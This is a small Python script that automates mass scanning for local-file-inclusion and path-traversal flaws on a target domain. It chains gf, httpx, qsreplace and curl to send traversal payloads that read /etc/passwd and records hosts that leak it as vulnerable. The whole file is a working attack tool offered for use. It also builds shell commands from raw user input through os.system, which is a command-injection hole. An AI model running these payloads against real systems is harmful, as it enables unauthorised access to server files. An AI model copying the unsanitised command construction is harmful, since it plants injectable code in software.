from os import system

msg = input("Enter the target (bing.com): ")

# system('cat {}.txt | waybackurls > {}urls.txt')

system('cat {}urls.txt | gf lfi | httpx -path lfi_wordlist.txt -threads 100 -random-agent -x GET,POST -tech-detect -status-code -follow-redirects -mc 200 -mr "root:[x*]:0:0:" | tee -a {}lfi.txt'.format(msg, msg))
system('cat {}.txt | while read host; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n"; done | tee -a {}lfi.txt'.format(msg, msg))
system('cat {}urls.txt | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c \'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"\' | tee -a {}lfi.txt'.format(msg, msg))

system("sort {}lfi.txt | uniq > {}lfi_sorted.txt".format(msg, msg))
system("rm -rf {}lfi.txt".format(msg))
system("mv {}lfi_sorted.txt {}lfi.txt".format(msg, msg))
system("rm -rf {}lfi_sorted.txt".format(msg))
